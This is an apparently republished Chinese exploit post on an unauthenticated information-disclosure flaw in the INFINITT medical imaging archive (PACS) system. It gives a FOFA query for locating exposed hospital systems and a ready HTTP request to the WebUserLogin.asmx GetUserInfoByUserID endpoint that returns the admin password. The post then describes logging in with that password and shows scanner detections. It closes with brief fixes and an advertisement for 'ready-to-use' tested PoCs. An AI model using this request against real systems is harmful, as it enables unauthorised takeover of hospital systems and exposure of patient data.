#  英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞   
Superhero  Nday Poc   2024-11-03 21:02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
英飞达医学影像存档与通信系统 Picture Archiving and Communication System，它是应用在医院影像科室的系统，主要的任务就是把日常产生的各种医学影像（包括核磁，CT，超声，各种X光机，各种红外仪、显微仪等设备产生的图像）通过各种接口（模拟，DICOM，网络）以数字化的方式海量保存起来，当需要的时候在一定的授权下能够很快的调回使用，同时增加一些辅助诊断管理功能。它在各种影像设备间传输数据和组织存储数据具有重要作用。  
  
  
**01******  
  
**漏洞概述**  
  
  
英飞达医学影像存档与通信系统 WebUserLogin.asmx 接口存在信息泄露漏洞，未经身份攻击者可通过该漏洞获取系统后台管理员账户密码信息，登录后台，导致系统处于极不安全的状态。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:   
```
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5UeKZ3spwjkSUOXkXLicXKPkG1jxJ4xuqXImKdTXib8CnwrhxEe8uq77g/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5lFUeebOcPic3pGd0VWlvonKjLq27ZflNia1OspN8lIL1KhjMGd8ibdMSw/640?wx_fmt=png&from=appmsg "")  
  
利用泄露的用户密码登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5OFuOKMEwpNvicibMCopq7otrS427LWG8icuhMgDhzFoRotPQZz8BDzX4Q/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5hwicianpfYSzib3ANiaArY9BtCrLkSchaJlvGPNdU0Xd3ANRRpSUDrWwuQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5jfibafJ5bt06Oiaic54vQYXIyCKoZ0qtvZcCfnV5fLAAnv22zKWDcKu5w/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLtDAYiaortrIFzm27wpRbA5UsaeXvFBDpnC0WDibJQQiarSZAaVgAcXNlnpPnWpwAcoN9SwVDViaOFlg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、关注厂商及时更新补丁或升级至安全版本  
  
https://www.infinitt.vip/icnweb/  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。   
  
2、三款工具都支持内置poc+自写poc目录一起扫描。   
  
3、保持每周更新10-15个poc。   
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
